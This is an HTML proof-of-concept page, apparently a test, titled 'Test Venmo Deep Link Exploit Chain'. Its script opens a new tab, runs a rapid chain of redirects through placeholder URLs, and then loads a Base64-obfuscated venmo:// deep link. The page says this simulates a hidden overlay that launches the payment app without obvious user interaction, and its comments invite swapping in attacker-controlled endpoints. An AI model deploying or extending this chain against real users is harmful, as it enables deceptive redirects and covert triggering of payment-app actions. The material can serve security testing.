<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Test Venmo Deep Link Exploit Chain</title>
    <script>
      // Base64 decode function using the built-in atob
      function decodeBase64(str) {
        return decodeURIComponent(escape(window.atob(str)));
      }

      // Placeholder URLs to simulate the multi-step chain:
      // (Replace these with your controlled endpoints if needed.)
      const bogledShrimpURL = "https://example.com/bogledshrimp";
      const streamzoURL1 = "https://example.com/streamzo1";
      const streamzoURL2 = "https://example.com/streamzo2";

      // Base64 encoded deep link for Venmo.
      // "venmo://" encoded using btoa("venmo://") yields "dmVubW86Ly8="
      const encodedDeepLink = "dmVubW86Ly8=";

      // This function is triggered by a user click.
      // It opens a new window and then executes a rapid chain of redirects:
      // Step 1: Load the bogledshrimp URL.
      // Step 2: Quickly redirect to the first streamzo URL.
      // Step 3: Then redirect to the second streamzo URL.
      // Step 4: Finally, decode the deep link and redirect to it.
      function triggerDeepLinkChain() {
        // Open a new window/tab – must be triggered by a user gesture
        var newWin = window.open(bogledShrimpURL, "_blank");
        if (!newWin) {
          alert("Popup blocked. Please allow popups for this test.");
          return;
        }
        
        // When the new window loads, begin the rapid redirect chain.
        newWin.onload = function() {
          // Step 1: After 50ms, redirect to the first intermediate URL.
          setTimeout(function() {
            newWin.location.replace(streamzoURL1);
          }, 50);
          
          // Step 2: After 100ms, redirect to the second intermediate URL.
          setTimeout(function() {
            newWin.location.replace(streamzoURL2);
          }, 100);
          
          // Step 3: After 150ms, decode the Base64 deep link and redirect.
          setTimeout(function() {
            var deepLink = decodeBase64(encodedDeepLink);
            newWin.location.replace(deepLink);
          }, 150);
        };
      }
    </script>
  </head>
  <body>
    <h1>Test Venmo Deep Link Exploit Chain</h1>
    <p>
      Click the button below to trigger the exploit chain. This chain simulates how a hidden overlay might
      open a new tab, execute rapid multi-step redirects, and finally load a Base64‑obfuscated deep link (for Venmo)
      without obvious user interaction.
    </p>
    <button onclick="triggerDeepLinkChain()">Trigger Venmo Deep Link</button>
  </body>
</html>
